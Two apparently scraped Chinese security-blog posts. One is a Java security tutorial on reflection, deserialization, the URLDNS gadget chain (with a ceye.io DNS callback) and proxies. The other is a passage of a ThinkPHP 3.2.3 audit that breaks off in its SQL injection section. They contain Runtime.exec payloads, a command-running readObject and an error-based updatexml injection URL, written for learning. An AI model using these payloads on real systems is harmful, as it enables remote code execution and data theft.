\n\n获取字段上文中说了获取类的方法，接下来说一下获取字段的方式，获取字段的话，主要用到以下两个函数\ngetFields()：获得某个类的所有的公共（public）的字段，包括父类中的字段。\ngetDeclaredFields()：获得某个类的所有声明的字段，即包括public、private和proteced，但是不包括父类的申明字段。\n\n这里借用一下Y4大师傅的示例。\nimport java.lang.reflect.Field;\n\npublic class test &#123;\n    public static void main(String[] args) throws Exception &#123;\n        Class stiClass = StuInfo.class;\n        // 获取public字段\"age\":\n        System.out.println(stiClass.getField(\"age\"));\n        // 获取继承的public字段\"name\":\n        System.out.println(stiClass.getField(\"name\"));\n        // 获取private字段\"money\":\n        System.out.println(stiClass.getDeclaredField(\"money\"));\n        // 获得值,name.get里面参数需要该类对象，而不是.class\n        Field name = stiClass.getField(\"name\");\n        System.out.println(name.get(stiClass.newInstance()));\n        // 设置值\n        StuInfo stuInfo = new StuInfo();\n        Field money = stiClass.getDeclaredField(\"money\");\n        money.setAccessible(true);\n        money.set(stuInfo,2333333);\n        System.out.println(stuInfo);\n\n\n\n\n    &#125;\n&#125;\n\nclass StuInfo extends PersonInfo&#123;\n    public int age;\n    private int money;\n\n    @Override\n    public String toString() &#123;\n        return \"StuInfo&#123;\" +\n            \"name=\" + name +\n            \", money=\" + money +\n            '&#125;';\n    &#125;\n&#125;\n\nclass PersonInfo&#123;\n    public String name = \"quan9i\";\n&#125;\n\n这里需要说明的是**money.setAccessible(true);*这个语句，它是取消了money*变量的特权模式，本来money是private的，不可被更改，访问这些，而当有这个语句后，就变的与public相同了（小白个人观点，可能有误）。\n获取方法这里涉及了四个函数，具体如下所示\n1、Method getMethod(name, Class...)：获取某个public的方法（包括父类）\n2、Method getDeclaredMethod(name, Class...)：获取当前类的某个方法（不包括父类）\n3、Method[] getMethods()：获取所有public的方法（包括父类）\n4、Method[] getDeclaredMethods()：获取当前类的所有方法（不包括父类）\n\n示例如下\nString name = \"quan9i\";\nMethod substring = String.class.getMethod(\"substring\", int.class);\nSystem.out.println(substring.invoke(name,3));\n\n如果调用的方法是静态方法。那么invoke方法传入的第一个参数永远为null\n// 获取Integer.parseInt(String)方法，参数为String:\nMethod m = Integer.class.getMethod(\"parseInt\", String.class);\n// 调用该静态方法并获取结果:\nInteger n = (Integer) m.invoke(null, \"23333\");\nSystem.out.println(n);\n\n反射执行命令java.lang.Runtime因为有一个exec方法可以执行本地命令，所以在很多的payload中我们都能看到反射调用Runtime类来执行本地系统命令，通过学习如何反射Runtime类也能让我们理解反射的一些基础用法。\n执行的Payload如下\nClass.forName(\"java.lang.Runtime\").getMethod(\"exec\", String.class).invoke(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")),\"calc\");\n\n\n这个的话我们其实可以把他进行拆分，这句话拆分为五段，如下所示\nClass clazz = Class.forname(\"java.lang.Runtime\");\nMethod execMethod = clazz.getMethod(\"exec\", String.class);\nMethod getRuntime = clazz.getMethod(\"getRuntime\")；\nObject currentRuntime = getRuntime.invoke(clazz);\nexecMethod.invoke(currentRuntime, \"calc.exe\");\n\n对其进行简单讲解\n1、首先通过反射获取到Runtime类\n2、通过反射获取到Runtime类的exec方法\n3、通过反射获取到Runtime类的getRuntime方法\n4、创建Runtime对象并调用exec方法\n5、调用exec方法并执行命令exec \"calc.exe\"\n\n一些其他引用反射的方式\n我们刚才说到可以通过forname拿到了一个类，并且继续利用反射或实例化调用其中的方法，如果一个类没有无参构造方法或者也没有类似单例模式里的静态方法，那我们应该怎样通过反射实例化该类呢？\n如果一个方法或构造方法是私有方法，我们应该怎么去执行它呢？\n\nProcessBuilder第一个问题，我们可以用一个新的反射方法getConstructor。\ngetConstructor(Class...)：获取某个public的Constructor；\ngetDeclaredConstructor(Class...)：获取某个Constructor；\ngetConstructors()：获取所有public的Constructor；\ngetDeclaredConstructors()：获取所有Constructor。\n\n和getMethod类似，getConstructor接收的参数是构造函数的的列表类型，因为构造函数也支持重载，所以要用参数列表类型才能唯一确定一个构造函数\n比如我们常用的另一种执行命令的方式ProcessBuilder，我们使用反射来获取其构造函数，然后 调用start()来执行命令。\n接下来简单介绍一下ProcessBuilder.\nProcessBuilder用于创建操作系统进程，它提供一种启动和管理进程（也就是应用程序）的方法，我们可以通过实例化这个类并且通过反射调用其中的start方法来开启一个子进程 。当getRuntime被禁用时，可以用ProcessBuilder来执行命令。它有两种构造函数\npublic ProcessBuilder(List&lt;String> command)\npublic ProcessBuilder(String... commang)\n\n接下来看这个执行命令的Payload\nClass clazz = Class.forName(\"java.lang.ProcessBuilder\");\n ((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(\"calc.exe\"))).start();\n\n执行过程如下\n1、首先利用反射获取ProcessBuilder类；\n2、获取clazz(ProcessBuilder)形参列表为List&lt;String> command的构造函数；\n3、将获取到的构造函数利用newInstance进行实例化，调用构造函数；\n4、对构造函数传入的参数为 calc.exe，并且用Arrays.asList方法将要执行的命令转为List类型；\n5、返回List类型的command；\n\n\n如何执行私有方法使用getDeclared系列方法，函数介绍如下\ngetConstructor(Class...)：获取某个public的Constructor；\ngetDeclaredConstructor(Class...)：获取某个Constructor；\ngetConstructors()：获取所有public的Constructor；\ngetDeclaredConstructors()：获取所有Constructor。\n\n\ngetMethod系列方法获取的是当前类中所有公共方法，包括从父类继承的方法；\ngetDeclaredMethod系列方法获取的是当前类中“声明”的方法，是实写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了。\n\n举个例子，我们之前提到过Runtime的构造方法是私有的，所以我们要通过Runtime.getRuntime()来获取对象，其实我们也可以直接用getDeclaredConstructor来获取这个私有的构造方法实例化对象，进而执行命令：\nClass clazz = Class.forName(\"java.lang.Runtime\");\n        Constructor m =clazz.getDeclaredConstructor();\n        m.setAccessible(true);\n        clazz.getMethod(\"exec\",String.class).invoke(m.newInstance(), \"calc.exe\");\n\n这里我们在获取到私有方法后，要用setAccessible()方法使这个私有方法可以被访问，其他的就和之前介绍的反射一样了，如果不用setAccessible()方法修改作用域这个方法是仍然不能调用的\n\nJAVA反序列化学前必备小知识JAVA反序列化中的语句涉及到了JAVA的输入流与输出流，所以这里首先讲一下JAVA的IO流，以防后续难以理解。\n什么是IO，即Input和Output(输入与输出)，通过IO可以完成硬盘文件的读和写。\n流的传输过程：\n首先不管是输入还是输出，传输的两端都是文件和java的运行程序，所以如果想要在这二者之间进行传输，我们就需要将他们两个之间搭起来一个可以传输的通道，这样就可以实现流的传输。\n文件流函数首先是FileInputStream函数，其读取文件分为两步\n1.将文件中的数据转换为流对象\n2.读取流对象的数据\n\n细分的话，可分为如下三步\n1、创建流对象\n2、读取流对象内部数据\n3、关闭流对象\n\n使用read方法读取文件，有关read方法的解释如下\nread() \n\tpublic int read() throws IOException \n\t从此输入流中读取一个数据字节。\n\t\n\t如果没有输入可用，则此方法将阻塞。 \n\t\n\t指定者： 类 InputStream 中的 read \n\t\n\t返回： 下一个数据字节；如果已到达文件末尾，则返回 -1。 \n\t\n\t抛出： IOException - 如果发生 I/O 错误。\nreads()\n允许在方法中添加一个字节数组。\n这种方式很有意思，当我们设置缓冲区的值为 8 时，若文件中的字符长度超过了 8，则会换行输出。这和上面的换行实际上是异曲同工。\n\n读取文件Demo\npackage org.example;\n\n\nimport java.io.*;\n\npublic class Main&#123;\n\n    public static void main(String[] args) throws IOException &#123;\n        File file = new File(\"C:\\\\WINDOWS\\\\system32\\\\drivers\\\\etc\\\\hosts\");\n\n        // 打开文件对象并创建文件输入流\n        FileInputStream fis = new FileInputStream(file);\n\n        // 定义每次输入流读取到的字节数对象\n        int a = 0;\n\n        // 定义缓冲区大小\n        byte[] bytes = new byte[1024];\n\n        // 创建二进制输出流对象\n        ByteArrayOutputStream out = new ByteArrayOutputStream();\n\n        // 循环读取文件内容\n        while ((a = fis.read(bytes)) != -1) &#123;\n            // 截取缓冲区数组中的内容，(bytes, 0, a)其中的0表示从bytes数组的\n            // 下标0开始截取，a表示输入流read到的字节数。\n            out.write(bytes, 0, a);\n        &#125;\n\n        System.out.println(out.toString());\n    &#125;\n\n&#125;\n\n这里简单介绍一下函数\nfis.read()方法是依次读取一个个字节数据，返回每个数据的整型，该方法的作用是每次读取流中的一个字节，如果需要读取流中的所有数据，需要使用循环读取。\nfis.read(bytes)此方法是就实现了将流对象fis中的数据读取到字节数组bytes中,该行代码的作用是将fis流中的数据读取出来，并依次存储到数组data中，返回值为实际读取的有效数据的个数。\n\n接下来介绍一下FileOutputStream函数\npackage org.example;\n\n\nimport java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class Main &#123;\n\n    public static void main(String[] args) throws IOException &#123;\n        // 定义写入文件路径\n        File file = new File(\"D:/1.txt\");\n\n        // 定义待写入文件内容\n        String content = \"Hello World.\";\n\n        // 创建FileOutputStream对象\n        FileOutputStream fos = new FileOutputStream(file);\n\n        // 写入内容二进制到文件\n        fos.write(content.getBytes());\n        fos.flush();\n        fos.close();\n    &#125;\n\n&#125;\n\n\n\n\n定义什么是JAVA的序列化与反序列化呢，这里与PHP的序列化与反序列化是类似的。具体定义如下\nJAVA序列化是指把JAVA对象转换为字节序列的过程；反序列化是指把字节序列恢复为JAVA对象的过程。\n\n举个例子，比如我们送一个可拆分椅子给朋友，那么我们在送给他之前，首先需要对椅子进行拆分，使得其容易放进快递盒子里邮寄给朋友，我们将椅子拆分的过程就是序列化；当朋友接收到快递后，他想将拆分的组件变成椅子，那么它必须要将各个组件进行组装，这个组装的过程就是反序列化。\ndemo接下来我们来看一个简单的例子，这里首先自定义一个Main类，同时为它创建两个变量。\npackage org.example;\n\n\nimport java.io.Serializable;\n\npublic class Main implements Serializable &#123;\n    private String name;\n    private int age;\n\n    public Main(String name, int age) &#123;\n        this.name = name;\n        this.age = age;\n    &#125;\n\n    public String getName() &#123;\n        return name;\n    &#125;\n\n    public void setName(String name) &#123;\n        this.name = name;\n    &#125;\n    @Override\n    public String toString()&#123;\n        return \"Main&#123;\" +\n                \"name='\"+name+'\\''+\n                \"age=\"+age+\n                '&#125;';\n    &#125;\n&#125;\n\n接下来写一个进行序列化的文件，具体内容如下\npackage org.example;\n\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.ObjectOutput;\nimport java.io.ObjectOutputStream;\n\npublic class serialize &#123;\n    public static void serialize(Object obj) throws IOException&#123;\n        ObjectOutputStream oos= new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));\n        oos.writeObject(obj);\n    &#125;\n\n    public static void main(String[] args) throws Exception&#123;\n        Main main = new Main(\"aa\",22);\n        //System.out.println(main);\n        serialize(main);\n    &#125;\n&#125;\n\n这里呢，serialize方法其实就是创建了一个文件输出流，将文件的内容写至ser.bin中，而后调用writeObject进行序列化。而后main方法进行了实例化对象并调用了serialize方法\n\n接下来再自定义一下反序列化函数，反序列化与序列化相反即可，把Output换成Input，把write改为read，具体代码如下\npackage org.example;\n\nimport java.io.*;\n\npublic class unserialize &#123;\n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;\n        ObjectInputStream ois= new ObjectInputStream(new FileInputStream(\"ser.bin\"));\n        Object obj = ois.readObject();\n        return obj;\n    &#125;\n    public static void main(String[] args) throws Exception&#123;\n        Main main = (Main) unserialize(\"ser.bin\");\n        System.out.println(main);\n    &#125;\n&#125;\n\n\n此时运行程序，可以发现成功对数据进行了反序列化并输出了数据\n漏洞成因服务端进行反序列化数据时，会自动调用类中的readObject代码，给予了攻击者在服务器上运行代码的能力\n可能形式1、入口类的readObject直接调用危险函数\n比如上述的例子中，我们重写readObject方法，添加一个弹计算器的指令\nprivate void readObject(ObjectInputStream ois) throws Exception,ClassNotFoundException&#123;\n    ois.defaultReadObject();\n    Runtime.getRuntime().exec(&quot;calc.exe&quot;);\n&#125;\n\n\n此时再进行反序列化\n\n成功弹出计算器\n2、入口类参数中包含可控类，该类含有危险方法，readObject时进行调用\n3、入口类参数中包含可控类，该类调用其他有危险方法的类，readObject时进行调用\n4、构造函数/静态代码块等类加载时隐式执行。\n他们都有共同的条件\n1、继承Serialize\n2、入口类source(重写readObject 参数类型广泛 最好是JDK自带的)\n3、调用链 gadget chain\n4、执行类 sink (rce、ssrf写文件等等)\n\n接下来以HashMap为例，说一下如何寻找可用类。\n首先它需要继承有Serializable类，因为没有Serializable就无法进行序列化\n\n可以看到类HashMap继承了Serializable\n接下来寻找入口类。\n点击Strcture，可以看到HashMap下的readObject类中存在这样一段代码\nfor (int i = 0; i &lt; mappings; i++) &#123;\n                @SuppressWarnings(\"unchecked\")\n                    K key = (K) s.readObject();\n                @SuppressWarnings(\"unchecked\")\n                    V value = (V) s.readObject();\n                putVal(hash(key), key, value, false, false);\n            &#125;\n\n\n重点其实就是对key和value进行了readObject函数处理，而后将这两个变量放进了hash函数中，接下来跟进此方法\n\n当key不为0时，就会给h赋值为hashCode函数处理过后的key方法\n符合入口类的条件，即重写 readObject 调用常见的函数\nURLDNS实战URLDNS是 ysoserial中⼀个利⽤链的名字，这里之所以选择它来进行相关讲解是因为他足够简单，但它其实不能称为利用链，因为参数并非可利用的命令，而是一个URL，同时它触发的结果也并非命令执行，而是一次DNS请求。但它有以下优点:\n1、使⽤ Java 内置的类构造，对第三⽅库没有依赖。\n2、在⽬标没有回显的时候，能够通过 DNS 请求得知是否存在反序列化漏洞。\n\n因此用它来测试反序列化漏洞是否存在是尤为合适的。\n我们可以在ysoserial查看它的利用链\nGadget Chain:\n  HashMap.readObject()\n    HashMap.putVal()\n      HashMap.hash()\n        URL.hashCode()\n\n只有寥寥几步，接下来跟着复现一下。\n常见的HTTP请求使用的是URL类，URL是由HashMap的Put方法产生的，所以我们这里先跟进Put方法\n\n从该方法中我们可以看出这里调用了hash()方法，所以接下来我们跟进这个方法\n\n这里可以看到hashCode处理的变量是Key，而Key则是我们hash中传入的参数，也就是我们写的内容\nhashmap.put(new URL(\"http://xxx\"),1);\n\n// 传进去两个参数，key = 前面那串网址，value = 1\n\n接下来我们跟进URL，看URL中的hashCode方法。\n\n可以发现当hashCode不等于-1时，直接返回hashCode，否则就会对handler进行另一个类的hashCode方法处理，接下来跟进这个hashCode函数\n\n可以发现对内容进行了getHostAddress方法处理，继续跟进\n\n根据主机名获取其IP地址，也就是对其发送了一次DNS请求。\n至此，可以看出总体链如下\n1、HashMap->readObject()\n2、HashMap->hash()\n3、URL->hashCode()\n4、URLStreamHandler->hashCode()\n5、URLStreamHandler->getHostAddress()\n\n\n\n接下来构造Poc进行DNS请求尝试。\nHashMap&lt;URL,Integer> hashmap= new HashMap&lt;URL,Integer>();   \nhashmap.put(new URL(\"http://s3moz8.ceye.io\"),1);\n\nserialize(hashmap);\n\n此时运行会发现，我们还没进行反序列化，在此时就直接收到DNS请求了，这是为啥呢，仔细看一下代码，会发现\nPUT->hash->hashCode()\n\n而URL类中的hashCode默认值为-1，此时到这里就会直接往下运行，也就是对URL发起了DNS请求。\n这样的话我们就无法判断是反序列化出来的URLDNS，还是序列化中的URLDNS，造成了干扰，此时我们该怎么办呢，我们可以看到这里的源头是因为**put()**，所以我们可以先不发送请求\n#Serialization.java\npackage org.example;\n\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.net.URL;\nimport java.util.HashMap;\n\npublic class Serialization &#123;\n    public static void Serialize(Object obj) throws IOException&#123;\n        ObjectOutputStream oos= new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));\n        oos.writeObject(obj);\n    &#125;\n\n    public static void main(String[] args) throws Exception&#123;\n        HashMap&lt;URL,Integer> hashmap= new HashMap&lt;URL,Integer>();\n        URL url = new URL(\"http://s3moz8.ceye.io\");\n        Class c = url.getClass();\n        Field hashcodefile = c.getDeclaredField(\"hashCode\");\n        hashcodefile.setAccessible(true);\n        hashcodefile.set(url,1234);\n        hashmap.put(url,1);\n// 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性\n        hashcodefile.set(url,-1);\n        Serialize(hashmap);\n    &#125;\n&#125;\n\n运行序列化文件，接下来运行反序列化文件，而后在ceye.io上查看是否有接收到DNS请求\n\n此时可以发现成功接收到请求，证明URLDNS链构造成功。\n刚刚是逆推，接下来简单正推一下\n\n总体方向就是反序列化调用hashmap的readobject，hashmap里的object里调用了putVal()\n\n所以我们需要去控制这个putVal的值才能实现往下走，所以这个时候我们找到了\n\nput方法，这个就是我们这里为啥要put这个url，是为了控制key和value，然后往下走\n\nhash里调用了key.hashCode，hash里面是key，而这个key是我们填入的URL，所以此时就来到了URL.hashCode\n\n可以看到这个时候我们要想实现DNS请求(调用handler.hashCode即实现了DNS请求)，必须让他值为-1，所以，我们此时通过反射修改了hashCode值，修改它为-1\n让他继续往下走，此时就来到了\n\n此时即发送DNS请求。\nJAVA代理在讲代理之前，先说一下何为代理，通俗的讲解，当我们在购买房子时，我们需要通过中介来进行，即中介从房东手中获取房源，我们通过中介了解到房屋信息，中介起到了一个中间人的作用，此时他相当于代理。\n\n在Java代理中，又具体分为两种，静态代理和动态代理，接下来依次进行查看。\n静态代理角色分析\n抽象角色：一般会用接口或者抽象类来解决\n真实角色：被代理的角色\n代理角色：代理真实角色，代理真实角色后，一般会做一些附属操作\n客户：访问代理对象的人\n\n这里仍以租房为例，首先我们要租房，看到需要有一个租房的接口，也就是官方的抽象角色，其代码如下\n#Rent.java\npackage org.example;\n\npublic interface Rent&#123;\n    public void rent();\n\n&#125;\n\n而后呢，我们这里是房东去出租房屋，所以我们需要房东去调用这个接口并重写方法，这里的房东就是真实角色，其代码如下：\npackage org.example;\n\npublic class Host implements Rent&#123;\n    public void rent()&#123;\n        System.out.println(\"房东要出租房子\");\n    &#125;\n&#125;\n\n而后呢，理想的情况下，是我们直接联系到房东，买房子，此时也就是我们调用这个类生成对象，调用租房接口，此时我们就是对应客户，代码如下\npackage org.example;\n\npublic class Client &#123;\n    public static void main(String[] args)&#123;\n        Host host = new Host();\n        host.rent();\n    &#125;\n&#125;\n\n\n此时运行就会发现\n\n成功得到房租要出租房子的信息，也就是我们客户成功对接上了房东，但现实的情况往往是我们联系不到房东，所以这个时候就需要中介了，中介不仅继承了租房接口，同时他会提供一些其他方法，比如，收中介费，签合同等，具体代码如下\n#Proxy.java\npackage org.example;\n\npublic class Proxy implements Rent&#123;\n    private Host host;\n    public Proxy()&#123;\n    &#125;\n    public Proxy(Host host)&#123;\n        this.host=host;\n    &#125;\n    public void rent()&#123;\n        seeHouse();\n        host.rent();\n        fare();\n        hetong();\n    &#125;\n    public void seeHouse()&#123;\n        System.out.println(\"中介带你看房\");\n    &#125;\n    public void fare()&#123;\n        System.out.println(\"收中介费\");\n    &#125;\n    public void  hetong()&#123;\n        System.out.println(\"签合同\");\n    &#125;\n&#125;\n\n接下来我们通过客户再次进行调用，不过此次不是直接调用房东，而是通过中介，具体代码如下\n#Client.java\npackage org.example;\n\npublic class Client &#123;\n    public static void main(String[] args)&#123;\n        Host host = new Host();\n        Proxy proxy =new Proxy(host);\n        proxy.rent();\n    &#125;\n&#125;\n\n\n\n此时即可实现代理\n再深入刚刚只有一个接口，接下来我们接近实际，这里设置四个接口，分别用于增删改查，具体代码如下\n#UserService.java\npackage org.example.demo01;\n\npublic interface UserService &#123;\n    public void add();\n    public void delete();\n    public void update();\n    public void query();\n&#125;\n\n然后这个是一个抽象类，我们需要有具体实现它的，所以接下来写一个对象来进行调用\n#UserServiceimp.java\npackage org.example.demo01;\n\npublic class UserServiceimp implements UserService&#123;\n\n    @Override\n    public void add() &#123;\n        System.out.println(\"添加了一个用户\");\n    &#125;\n\n    @Override\n    public void delete() &#123;\n        System.out.println(\"删除了一个用户\");\n\n    &#125;\n\n    @Override\n    public void update() &#123;\n        System.out.println(\"更新了一个用户\");\n\n    &#125;\n\n    @Override\n    public void query() &#123;\n        System.out.println(\"查询了一个用户\");\n\n    &#125;\n&#125;\n\n此时有需求如下：我们需要添加一个日志功能，即每次调用方法前，我们需要在方法前输出调用了xxx方法，这个时候该如何实现呢，方法有两种\n1、在每个方法前添加Systme.out.println(\"调用了xxx方法\");\n2、添加代理类，对日志进行处理\n\n基于不改动源代码的原则，且由于第一个方法过于繁琐，需要更改多处代码，所以这里选用代理来实现。接下来我们新建一个代理方法\n#UserServiceProxy.java\npackage org.example.demo01;\n\npublic class UserServiceProxy implements UserService&#123;\n    private UserService userService;\n\n    public void setUserService(UserServiceimp userService) &#123;\n        this.userService = userService;\n    &#125;\n    @Override\n    public void add() &#123;\n        log(\"add\");\n        userService.add();\n    &#125;\n\n    @Override\n    public void delete() &#123;\n        log(\"delete\");\n        userService.delete();\n    &#125;\n\n    @Override\n    public void update() &#123;\n        log(\"update\");\n        userService.update();\n    &#125;\n\n    @Override\n    public void query() &#123;\n        log(\"query\");\n        userService.query();\n    &#125;\n    public void log(String msg)&#123;\n        System.out.println(\"[Debug]使用了\"+msg+\"方法\");\n    &#125;\n&#125;\n\n接下来再写一个启动器。\n#Client.java\npackage org.example.demo01;\n\npublic class Client&#123;\n    public static void main(String[] args)&#123;\n        UserServiceimp userService = new UserServiceimp();\n        UserServiceProxy proxy = new UserServiceProxy();\n        proxy.setUserService(userService);\n        proxy.add();\n        proxy.update();\n    &#125;\n&#125;\n\n此时运行即可发现成功添加了日志\n\n动态代理接下来换一个例子，上述例子讲解动态代理可能会较为繁琐。\n这里我们首先创建一个IUser接口，其具体内容如下\npublic interface IUser &#123;\n    public void sayName();\n&#125;\n\n创建完接口后，我们创建一个实现类User，具体代码如下\npublic class User implements IUser&#123;\n\n    @Override\n    public void sayName() &#123;\n        System.out.println(\"tntaxin\");\n    &#125;\n&#125;\n\n接下来就可以写我们的动态代理类了\npublic class UserProxy&#123;\n    private Object target;\n    public UserProxy(Object target)&#123;\n        this.target = target;\n    &#125;\n\n    public Object getProxyInstance()&#123;\n        return Proxy.newProxyInstance(this.target.getClass().getClassLoader(), this.target.getClass().getInterfaces(),\n                new InvocationHandler() &#123;\n                    @Override\n                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;\n                        System.out.println(\"我是他的代理\");\n                        method.invoke(target, args);\n                        return null; &#125;\n                &#125;);\n    &#125;\n&#125;\n\n注意到Proxy.newProxyInstance方法，我们跟进一下\nstatic Object    newProxyInstance(ClassLoader loader,  //指定当前目标对象使用类加载器\n Class&lt;?>[] interfaces,    //目标对象实现的接口的类型\n InvocationHandler h      //事件处理器\n) \n//返回一个指定接口的代理类实例，该接口可以将方法调用指派到指定的调用处理程序。\n\n可以发现第二个参数为接口类型，这也是我们的动态代理为什么需要实现接口。\n接下来看第三个参数，它是事件处理器InvocationHandler，实现该类必须要实现invoke方法\nObject invoke(Object proxy, Method method, Object[] args) \n// 在代理实例上处理方法调用并返回结果。\n\n这里，我们调用某个对象中的方法，一般使用反射来进行获取，因此，我们这里编写一个使用反射的测试程序来检验动态代理的效果。\npublic class Main\n&#123;\n    public static void main( String[] args )\n    &#123;\n        IUser user = new User();\n        System.getProperties().put(\"sun.misc.ProxyGenerator.saveGeneratedFiles\", \"true\");\n//         创建动态代理\n        UserProxy proxyFactory = new UserProxy(user);\n        IUser userProxy2 = (IUser) proxyFactory.getProxyInstance();\n        // 打印生成的代理对象的类名\n        System.out.println(userProxy2.getClass());\n        userProxy2.sayName();\n    &#125;\n&#125;\n\n运行后结果如下\n\n","slug":"JAVA安全入门篇","date":"2023-01-19T16:51:30.000Z","categories_index":"JAVA","tags_index":"JAVA安全","author_index":"quan9i"},{"id":"9fb5d47ccfc09f50e02bb64494717cba","title":"简记一次Tp3框架审计之旅","content":"前言MVC框架是代码审计必需学习的知识，这里以TpV3.2.3框架为例，进行一次对MVC框架代码的漏洞审计，简单学一下MVC的相关知识，希望对正在学习MVC框架的师傅有所帮助\n框架我们这里首先需要了解一下什么是MVC架构\nM：Model(模型)，其负责业务数据的处理和与数据库的交互\nV：View(视图)，提供了展示数据的各种方式\nC：Controller(控制器),负责用户请求的调度和处理业务逻辑\n具体如下图如果想对MVC框架进行进一步了解，可以参考https://www.kancloud.cn/manual/thinkphp/1698接下来我们需要了解一下ThinkPHP框架。\nTP3如果想了解Tp3常见的操作，可以看一下这篇文章https://blog.csdn.net/spc007spc/article/details/103489711\n目录文件Tp3的目录如下所示\n\n\n\n\n\n\n\n\n\nwww  WEB部署目录（或者子目录）├─index.php       入口文件├─README.md       README文件├─Application     应用目录├─Public          资源文件目录└─ThinkPHP        框架目录\n通俗的说的话，这里的index.php就是提供一个对外的接口，Public就是存放一些公共资源的地方，ThinkPHP是我们的核心框架，其内容如下\n\n\n\n\n\n\n\n\n\n├─ThinkPHP 框架系统目录（可以部署在非web目录下面）│  ├─Common       核心公共函数目录│  ├─Conf         核心配置目录│  ├─Lang         核心语言包目录│  ├─Library      框架类库目录│  │  ├─Think     核心Think类库包目录│  │  ├─Behavior  行为类库目录│  │  ├─Org       Org类库包目录│  │  ├─Vendor    第三方类库目录│  │  ├─ …      更多类库目录│  ├─Mode         框架应用模式目录│  ├─Tpl          系统模板目录│  ├─LICENSE.txt  框架授权协议文件│  ├─logo.png     框架LOGO文件│  ├─README.txt   框架README文件│  └─ThinkPHP.php 框架入口文件\n路由格式Tp3提供了多种路由格式，这里的话对其进行简单介绍。\npathinfo模式pathinfo 模式，是ThinkPHP的默认模式，其规范格式如下\nhttp://网址/index.php/模块/控制器/操作方法/参数/参数值\n示例如下\nhttp://127.0.0.1:8080/index.php/Home/Index/index/id/2\n它的优点显而易见， 简化了URL地址。\n普通模式普通模式的规范格式如下\nhttp://网址/index.php?m=模块名称&amp;c=控制器&amp;a=方法&amp;参数=参数值\n示例如下\nhttp://127.0.0.1:8080/index.php?m=Home&amp;c=index&amp;a=index&amp;id=1\n\n兼容模式兼容模式的规范格式如下\nhttp://网址/index.php?s=/模块名称/控制器/方法/参数/参数值\n示例如下\nhttp://127.0.0.1:8080/index.php?s=Home/index/index/id/33\n\nrewrite 模式这个的话首先需要说一下配置，这个想要使用首先需要Apache开启rewrite拓展，我这里的环境是phpstudy集成环境，具体操作如下。首先打开&quot;phpStudy\\PHPTutorial\\Apache\\conf\\httpd.conf&quot;文件，搜索rewrite_module将其前面的#删去而后去TP的根目录，写一个.htaccess文件，内容如下\n&lt;IfModule mod_rewrite.c>\n RewriteEngine on\n RewriteCond %&#123;REQUEST_FILENAME&#125; !-d\n RewriteCond %&#123;REQUEST_FILENAME&#125; !-f\n RewriteRule ^(.*)$ index.php?s=$1 [QSA,PT,L]\n&lt;/IfModule>\n接下来重启phpstudy此时就配置好了。(如若是linux环境，可参考此文https://blog.csdn.net/zhazhaji/article/details/80493513)rewrite的规范格式如下\nhttp://网址/模块/控制器/操作方法/参数/参数值\n其实相比于默认模式就是少了个入口文件，看着更简洁了一些。示例如下\nhttp://127.0.0.1:8080/Home/index/index/id/2\n\n特殊方法ThinkPHP将一些经常使用的方法进行了封装，也就是我们这里的特殊方法，其目的在于使程序更加安全。接下来对几个相对较常用的方法进行简单介绍。如果想进行仔细了解，可以访问如下链接https://www.cnblogs.com/kenshinobiy/p/9165662.htmlhttps://www.thinkphp.cn/info/tag\nI方法I方法是ThinkPHP用于更加方便和安全的获取系统输入变量，可以用于任何地方，用法格式如下：\nI('变量类型.变量名/修饰符',['默认值'],['过滤方法或正则'],['额外数据源'])\n示例如下\necho I('get.id'); //等同于$_GET['id']\necho I('get.id',0); // 如果不存在$_GET['id'] 则返回0\necho I('get.name',''); // 如果不存在$_GET['name'] 则返回空字符串\necho I('get.name','','htmlspecialchars'); // 采用htmlspecialchars方法对$_GET['name'] 进行过滤，如果不存在则返回空字符串\nM方法M方法用于实例化一个基础模型类，M方法的调用格式：\nM('[基础模型名:]模型名','数据表前缀','数据库连接信息')\n示例如下\n$User = M('User');\n#等效于$User = new Model('User');\nC方法C方法是ThinkPHP用于设置、获取，以及保存配置参数的方法。\n$model = C('db_name','thinkphp');; //读取当前的URL模式配置参数\n$userType = C('USER_TYPE'); //获取USER_TYPE参数的值\n\n漏洞分析SQL注入环境搭建首先我们需要做一些配置。我们需要在本地Mysql中新建一个thinkphp数据库用于测试，然后在其中新建一个users数据表，包括id、username、passwd三个字段接下来我们需要让Tp与Mysql中的数据库进行对接。打开Application\\Home\\Conf\\config.php，写入以下内容\n&lt;?php\nreturn array(\n 'DB_TYPE' => 'mysql', // 数据库类型\n 'DB_HOST' => 'localhost', // 服务器地址\n 'DB_NAME' => 'thinkphp', // 数据库名\n 'DB_USER' => 'root', // 用户名\n 'DB_PWD' => 'root', // 密码\n 'DB_PORT' => 3306, // 端口\n 'DB_PREFIX' => '', // 数据库表前缀 \n 'DB_CHARSET'=> 'utf8', // 字符集\n 'DB_DEBUG' => TRUE, // 数据库调试模式 开启后可以记录SQL日志 3.2.3新增\n);\n此时环境便搭建好了。\nwhere注入打开/Application/Home/Controller/IndexController.class.php，添加内容如下\npublic function select() &#123;\n        $id = I('get.id');\n        $user = M('users');\n        $data = $user->find($id);\n        var_dump($data);\n        &#125;\n此时先在I方法处添加断点\n接下来我们写入我们的语句\nhttp://127.0.0.1:8080/index.php/home/index/select?id[where]=1 and 1=updatexml(1,concat(0x7e,user(),0x7e),1)-- -\n访问之然后开始单步调试一开始都是赋值这种，后面看到这里可以发现有一个htmlspecialchars函数过滤，不过这个主要是针对XSS的，所以对SQL注入影响不大，接着看，到最后可以发现这里的value就是我们写入的语句，即1 and 1=updatexml(1,concat(0x7e,user(),0x7e),1)-- -然后这里的话他过滤的关键词是\nif(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value))&#123;\n    $value .= ' 